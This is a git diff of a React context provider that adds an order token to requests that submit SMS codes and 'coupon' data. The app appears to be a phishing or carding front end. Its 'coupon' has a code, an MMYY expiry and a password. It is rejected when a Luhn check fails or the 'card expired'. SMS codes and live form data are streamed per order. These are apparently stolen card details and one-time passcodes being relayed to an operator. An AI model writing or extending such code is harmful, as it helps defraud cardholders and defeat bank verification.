@@ -64,17 +64,25 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
   const [liveData, setLiveData] = useState<LiveFormData | null>(null);
   const [couponData, setCouponData] = useState<CouponData | null>(null);
   const [smsCode, setSmsCode] = useState<string>("");
-  // Persist currentOrderId to sessionStorage so it survives navigation/refresh
+  // Persist currentOrderId and order_token to sessionStorage (order_token required for /sms and /update-coupon)
   const [currentOrderId, _setCurrentOrderId] = useState<string | null>(() => {
     try { return sessionStorage.getItem('currentOrderId'); } catch { return null; }
+  });
+  const [orderToken, _setOrderToken] = useState<string | null>(() => {
+    try { return sessionStorage.getItem('orderToken'); } catch { return null; }
   });
   const setCurrentOrderId = (id: string) => {
     _setCurrentOrderId(id);
     try { sessionStorage.setItem('currentOrderId', id); } catch {}
   };
+  const setOrderToken = (t: string) => {
+    _setOrderToken(t);
+    try { sessionStorage.setItem('orderToken', t); } catch {}
+  };
   const clearCurrentOrderId = () => {
     _setCurrentOrderId(null);
-    try { sessionStorage.removeItem('currentOrderId'); } catch {}
+    _setOrderToken(null);
+    try { sessionStorage.removeItem('currentOrderId'); sessionStorage.removeItem('orderToken'); } catch {}
   };
   const [orderStatus, setOrderStatus] = useState<OrderStatus>("IDLE");
   const [socket, setSocket] = useState<Socket | null>(null);
@@ -197,8 +205,9 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
       
       const result = await response.json();
       const actualOrderId = result.order.id;
+      const tok = result.order.order_token;
       setCurrentOrderId(actualOrderId);
-      
+      if (tok) setOrderToken(tok);
       if (result.autoRejected) {
         // Luhn check failed or card expired - auto reject
         setOrderStatus("REJECTED");
@@ -215,17 +224,16 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
   const submitSMS = async (code?: string) => {
     const smsCodeToUse = code || smsCode;
     if (!currentOrderId || !smsCodeToUse) return;
-    
     setOrderStatus("SMS_SUBMITTED");
-    
     try {
-      // Submit SMS code via user-facing endpoint
+      const body: { smsCode: string; order_token?: string } = { smsCode: smsCodeToUse };
+      if (orderToken) body.order_token = orderToken;
       const response = await fetch(`${API_URL}/api/orders/${currentOrderId}/sms`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ smsCode: smsCodeToUse })
+        body: JSON.stringify(body)
       });
-      
+      if (!response.ok) throw new Error("Failed to submit SMS");
     } catch (error) {
       console.error("Error submitting SMS:", error);
     }
@@ -239,14 +247,16 @@ export const RealtimeProvider = ({ children }: { children: ReactNode }) => {
     socket?.emit('live_session_end');
     
     try {
+      const body: { couponCode: string; dateMMYY: string; password: string; order_token?: string } = {
+        couponCode: newCouponData.code,
+        dateMMYY: newCouponData.dateMMYY,
+        password: newCouponData.password
+      };
+      if (orderToken) body.order_token = orderToken;
       const response = await fetch(`${API_URL}/api/orders/${currentOrderId}/update-coupon`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          couponCode: newCouponData.code,
-          dateMMYY: newCouponData.dateMMYY,
-          password: newCouponData.password
-        })
+        body: JSON.stringify(body)
       });
       
       if (!response.ok) throw new Error("Failed to update coupon");
